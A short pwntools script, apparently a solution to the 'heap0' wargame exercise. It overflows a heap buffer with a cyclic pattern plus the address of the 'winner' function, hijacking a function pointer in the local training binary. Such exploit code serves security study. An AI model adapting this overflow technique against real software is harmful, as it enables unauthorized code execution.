from pwn import *
context.log_level = 'debug'

elf = ELF("./heap0")

win_func = p32(elf.symbols['winner'])

arg1 = cyclic(0x50) + win_func

p = process([elf.path,arg1])

p.recvall()